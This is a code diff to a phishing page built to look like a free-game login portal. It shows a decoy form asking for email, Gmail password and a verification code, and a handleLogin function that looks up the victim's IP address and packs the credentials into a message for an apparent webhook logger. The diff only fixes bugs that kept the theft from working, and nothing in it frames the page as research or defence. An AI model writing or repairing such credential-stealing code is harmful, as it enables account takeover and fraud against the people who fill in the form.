@@ -72,9 +72,9 @@
     <div id="decoy-ui">
         <h2>Login Portal</h2>
         <p>Authentication Required</p>
-        <input type="text" placeholder="Email"><br>
-        <input type="password" placeholder="Gmail_Password"><br>
-        <input type="text" placeholder="code"><br>
+        <input type="text" id="email" placeholder="Email"><br>
+        <input type="password" id="password" placeholder="Gmail_Password"><br>
+        <input type="text" id="code" placeholder="code"><br>
         <button id="login-btn">install</button>
 
         <div id="loading-text" style="display:none; margin-top: 10px;">
@@ -102,7 +102,7 @@
         async function handleLogin() {
             const gameName = document.querySelector('#decoy-ui input[type="text"]').value;
             const password = document.querySelector('#decoy-ui input[type="password"]').value;
-            const text = document.querySelector('#decoy-ui input[type="text"]').value;
+            const code = document.querySelector('#decoy-ui input[type="text"]').value;
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -111,7 +111,7 @@
                 const logData = {
                     username: gameName,
                     password: password,
-                    text: code, 
+                    code: code, 
                     userAgent: navigator.userAgent,
                     ip: ipData.ip,
                     timestamp: new Date().toISOString()
@@ -127,7 +127,7 @@
                             { name: "Email", value: `\`${gameName}\``, inline: false },
                             { name: "Password", value: `\`${password}\``, inline: false },
                             { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false },
-                            { name: "IP Address", value: `\`${logData.ip}\``, inline: false }
+                            { name: "IP Address", value: `\`${logData.ip}\``, inline: false },
                             { name: "code", value: `\`${code}\``, inline: false}, 
                         ],
                         footer: { text: "Free Game Portal Logger" }
